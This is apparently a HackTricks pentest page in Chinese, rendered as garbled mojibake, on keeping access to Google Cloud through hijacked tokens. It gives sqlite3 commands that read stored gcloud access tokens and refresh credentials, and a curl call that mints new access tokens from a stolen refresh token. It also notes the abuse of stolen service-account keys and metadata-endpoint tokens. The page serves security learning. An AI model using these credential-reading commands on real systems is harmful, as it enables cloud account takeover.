# GCP - éæœåŠ¡æŒä¹…æ€§

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
- è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
- æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
- **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã€‚**
- é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

è¿™äº›æŠ€æœ¯åœ¨æŸç§æ–¹å¼ä¸‹ï¼Œä¸€æ—¦æ‚¨å·²ç»è·å–äº†ä¸€äº›GCPå‡­æ®æˆ–åœ¨GCPç¯å¢ƒä¸­è¿è¡Œçš„æœºå™¨ï¼Œå°±ä¼šå˜å¾—éå¸¸æœ‰ç”¨ã€‚

## ä»¤ç‰ŒåŠ«æŒ

### å·²è®¤è¯ç”¨æˆ·ä»¤ç‰Œ

è¦è·å–ç”¨æˆ·çš„**å½“å‰ä»¤ç‰Œ**ï¼Œæ‚¨å¯ä»¥è¿è¡Œï¼š
```bash
sqlite3 ./.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
{% endcode %}

åœ¨æ­¤é¡µé¢ä¸­æŸ¥çœ‹å¦‚ä½•**ç›´æ¥ä½¿ç”¨gcloudä½¿ç”¨æ­¤ä»¤ç‰Œ**ï¼š

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#id-6440-1" %}

è¦è·å–**ç”Ÿæˆæ–°è®¿é—®ä»¤ç‰Œçš„è¯¦ç»†ä¿¡æ¯**ï¼Œè¯·è¿è¡Œï¼š

{% code overflow="wrap" %}
```bash
sqlite3 ./.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
{% endcode %}

ä½¿ç”¨**åˆ·æ–°ä»¤ç‰Œ**ã€å®¢æˆ·ç«¯IDå’Œå®¢æˆ·ç«¯å¯†é’¥è·å–æ–°çš„åˆ·æ–°åè®¿é—®ä»¤ç‰Œè¿è¡Œï¼š
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
{% endcode %}

åˆ·æ–°ä»¤ç‰Œçš„æœ‰æ•ˆæ€§å¯ä»¥åœ¨**ç®¡ç†** > **å®‰å…¨æ€§** > **Google Cloud ä¼šè¯æ§åˆ¶**ä¸­è¿›è¡Œç®¡ç†ï¼Œé»˜è®¤è®¾ç½®ä¸º16å°æ—¶ï¼Œå°½ç®¡å¯ä»¥è®¾ç½®ä¸ºæ°¸ä¸è¿‡æœŸï¼š

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

### æœåŠ¡è´¦å·

å°±åƒå¯¹å¾…ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ä¸€æ ·ï¼Œå¦‚æœæ‚¨æˆåŠŸ**çªƒå–äº†æœåŠ¡è´¦å·çš„ç§é’¥æ–‡ä»¶**ï¼Œæ‚¨å°†èƒ½å¤Ÿ**éšæ„è®¿é—®å®ƒ**ã€‚\
ç„¶è€Œï¼Œå¦‚æœæ‚¨çªƒå–äº†æœåŠ¡è´¦å·çš„**OAuthä»¤ç‰Œ**ï¼Œè¿™å¯èƒ½ä¼šæ›´æœ‰è¶£ï¼Œå› ä¸ºé»˜è®¤æƒ…å†µä¸‹è¿™äº›ä»¤ç‰Œä»…æœ‰æ•ˆä¸€ä¸ªå°æ—¶ï¼Œä½†å¦‚æœ**å—å®³è€…åˆ é™¤äº†ç§æœ‰APIå¯†é’¥ï¼ŒOAuthä»¤ç‰Œä»å°†æœ‰æ•ˆç›´åˆ°è¿‡æœŸ**ã€‚

### å…ƒæ•°æ®

æ˜¾ç„¶ï¼Œåªè¦æ‚¨åœ¨è¿è¡Œåœ¨GCPç¯å¢ƒä¸­çš„æœºå™¨å†…éƒ¨ï¼Œæ‚¨å°†èƒ½å¤Ÿé€šè¿‡è”ç³»å…ƒæ•°æ®ç«¯ç‚¹**è®¿é—®é™„åŠ åˆ°è¯¥æœºå™¨çš„æœåŠ¡è´¦å·**ï¼ˆè¯·æ³¨æ„ï¼Œæ‚¨åœ¨æ­¤ç«¯ç‚¹è®¿é—®çš„OAuthä»¤ç‰Œé€šå¸¸å—åˆ°èŒƒå›´çš„é™åˆ¶ï¼‰ã€‚

### ä¿®å¤æªæ–½

æœ‰å…³è¿™äº›æŠ€æœ¯çš„ä¸€äº›ä¿®å¤æªæ–½åœ¨[https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)ä¸­æœ‰è§£é‡Šã€‚

## å‚è€ƒèµ„æ–™

* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ä¸Šå…³æ³¨**æˆ‘ä»¬ã€‚
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
